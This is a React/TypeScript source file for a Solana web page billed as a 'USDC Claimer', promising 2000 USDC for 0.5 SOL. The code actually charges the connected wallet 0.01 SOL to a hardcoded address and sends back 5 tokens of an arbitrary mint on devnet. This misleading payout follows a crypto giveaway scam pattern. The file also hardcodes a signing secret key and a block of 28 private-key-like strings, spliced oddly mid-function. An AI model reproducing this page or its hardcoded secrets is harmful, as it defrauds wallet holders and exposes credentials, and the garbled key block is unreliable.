/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "YKupKc67fCoSkBF67vToncZpKxUrXFkwh6u9gYN67Vttgjhk24oYvqmryJf7UwrMY4b9TADBeUA85mkGj7SAKwa"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2kh6hTEePGUVMaJTfieNr66DXMi3zp1tiiAncbehy2bPtVRcsgRA9xeVr2UgYQr6wNGHWrTtPzFxHCERmESZqXe6",
  "key1": "npVk1wzDtwkgG6Eag1RTGcGRqsaWjDBpi77MTxWYETBWjqdeUnuwbaHtR8XDZLTw4foMh3mLs8TkMebiuY1bLR7",
  "key2": "4Nv42cAbQLyyM39WMK3dv6MhuofzwuY1qeDBdsXESAZ2EDUVydnjvpPdqTJ28J9cpfm1nCAxjuPGskYrDMQCs6Rc",
  "key3": "2AryDKf2c7JhnPYFxakEr93uHAi5bjUcKjAoijaXaTttueKPAQ2JZbW1SvYM23vFh3eyLjYQpTryL2K8fuYbezc8",
  "key4": "3RTqBBV9ZAumwzEXr86avbMsQmYwLi1xBNRz6JcvvKhJoxfTYY6mn2mr5nvYZUZYpGvJTxf8k3rJaZLB2Z8FELJu",
  "key5": "2WcmExPTPnBmgqChJV83v3QsE3d71Mrj6cNtW7c5oWBCSkZUo7ZWoiQYZtKZcaXoDUVsEmfa53AhRYvh6DGpttVb",
  "key6": "4mKHeyqVgHw7uUDbC6KKp1r4X7ue3rWiquLCNYhnDkQ6KH5yGSusAUZKszBjsHYpyRhoL3QKA6Cpk88ZvSyauzzF",
  "key7": "kBt5Lm3dZPC7GWNfZeUXsXQQNN8rThnyJaGWVTozLQYYREBEppcphJeVWTmhQnnvJKcZYkUAvpVt9Bnu2bvQU2T",
  "key8": "4YP8CfpEwaTUvg4PCGGubXtrHiSw3AfymP5Q6KCGmToq7kxVSz6WDi2JXvzgc1Ckbzh7eWWiWtoW53rwSnXx3yaM",
  "key9": "3ooWumBhD4n4t714vf9NAykbKd5aUER8AWK3mv1aBD3ZGMr5EUehnTMhS78kexQ33KNtMGNfuh98ydVgXcABZFPM",
  "key10": "2pcEfJwGrzQ9GanuVSMWKavQeVJHEpqBrmj1qA17PwSWYugRwC7SH2LfwnyrwJvd9grRfvaRU5HtToEuZk8MRZwS",
  "key11": "5T1GgtrGd1vkghSNASWkWg9SWxGeStiKcp5AZ6sT5ydk23zhmboPdWnJqdDunhohHWNBNJx7h8dhd6Uo77ABGTEd",
  "key12": "48XPopRQWfnXQp4oJgaMT2xh1bP6DtCcv4s9Fa2RhFe9hbXFn8k7hvLbc7AmwG8tdpQ3gEdepyU7t18ntZw43xvS",
  "key13": "4ayobP15kM4jdCMqyEHGba1p62NfKuHfxtujZ2k4Q8BLXHSDs3CuWKU5bnSP6Cjya2LesCrbv657F7dW3A4a6t1C",
  "key14": "3FGrDQ17PW6UyLMkU2K78nUezzvcnHRuJHPkdo8cupCwVzHzYy4gGjhKtV4RGrVYzquTu8oGpNq5KjoWRu1n1L3j",
  "key15": "tpqJzhqtHXim6zGgxebisWwjZhdgNSd5W5motN9EssUZhtDcnvzzrGLQM1uYqVMGNWzjKU33XUyDHE3QoYUaCSW",
  "key16": "AWgLsicmpY6qQLv2QZNJ2q4zvQCzXMd7owbZnENJGS1bMFbYNJc8HYKG6vGqj7CmJH1h19zM17DreLCNaRNEdax",
  "key17": "3hPH2LQtnjJmozffVeRddUENQuo2CNBACDQFSLATXsh9j4vjFbD34nvfrSjZewJny5gFZwQds7uNVo12tQkt3yiW",
  "key18": "3ochfuihkTBHetzQjx16JSKDhapMmfWPLeRD3Kud5rZ5WUniLPSrCm5SBqs3MFusTRqonar6Ph3mYtbhzTg1jL8n",
  "key19": "3AcB8RpDf7Js7FZR1HSFJebGNq7kcRoBgF68UU1goGatEFBnvNyqcLDtBsVfb2jFhRJmgikrUn2PKaZf63VNiJ8i",
  "key20": "4CnKiqYyrxZZRdniDcqwVu2JQh2tDZ2H9fvpMxpWFgS2WCcgJfBpgkct5fsE5FvxZvhKhfVsLfHiMbhX1BrMMga7",
  "key21": "4hw28ESC4prsR6Efco3w5hEyxEB6SvwLqFaB9HMikE44BjKaNMu1J3dEsCwV9udvcKrtsTxwnMrHNTEwgbZMmPGH",
  "key22": "3oTPEsphzjDHjyCcAvUrP7ECGW1e3zh7tm9aZJj8XhYmTprB7iJWe7bRYCJHzG4PyfX1esEQbEhQY4iUgCogTzTD",
  "key23": "3dHrWw8dtWT4gQdUwdR5THYrBTP3YzZzxWPK1xgMf23SANvzwt9LjSk48sCd4bEoN2uCQZsCV1ZZ9wD6M4Kri7V4",
  "key24": "5Pc7nXhjceiaFUN9SCM3bMHgicYG3tg9WhRRQtF9GJPLhBcbeRN5ZeWXeaKjazjGBqSuQzbChGFCDur7MPjmaMwf",
  "key25": "4mVAYsNLUMaERoEcmq815de1weeMBdhkCf2d7jPYDt9kFGC1n7TXz7UqH1eig9LqWCihhdgDvftnrYShbEwXLqwE",
  "key26": "2miQ9Fsa8v5C6fy2jFKBFSxjRexJTT6oWY5J98v5oQVSCpZjD7D6tpWAmgjmGVi6NNUoshobr9m2Wv9b2zyRC2qi",
  "key27": "4UMQhhmVkCHrweXyXfUfzer5HPUwU47quvgkqoKZGkAwQcaAYcmWUj9B48RB2k46KUFZVhezNjB9aeJfTSiUkkDo"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
